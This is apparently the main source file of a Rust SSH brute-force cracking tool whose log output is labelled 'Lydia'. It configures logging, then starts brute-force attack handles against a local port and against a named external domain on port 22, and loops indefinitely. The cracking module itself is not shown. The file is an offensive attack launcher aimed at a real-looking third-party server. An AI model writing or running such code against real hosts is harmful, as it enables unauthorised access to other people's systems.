mod cracker;
use colored::Colorize;
use core::time;
use std::{io::Write, thread};
use chrono::Local;
use env_logger::Builder;
use log::LevelFilter;
use cracker::ssh_cracker::create_ssh_brute_attack_handle;

fn setup_logging() {
    Builder::new()
        .format(|buf, record| {
            writeln!(buf,
                "[{}] {} [{}] - {}",
                "Lydia".yellow(),
                Local::now().format("%Y-%m-%dT%H:%M:%S").to_string().blue(),
                record.level(),
                record.args()
            )
        })
        .filter(None, LevelFilter::Info)
        .init();
}

#[tokio::main]
async fn main() {
    setup_logging();

    create_ssh_brute_attack_handle("127.0.0.1", 2222);
    create_ssh_brute_attack_handle("sten-heimbrodt.de", 22);

    loop {
        thread::sleep(time::Duration::from_millis(100));
    }
}
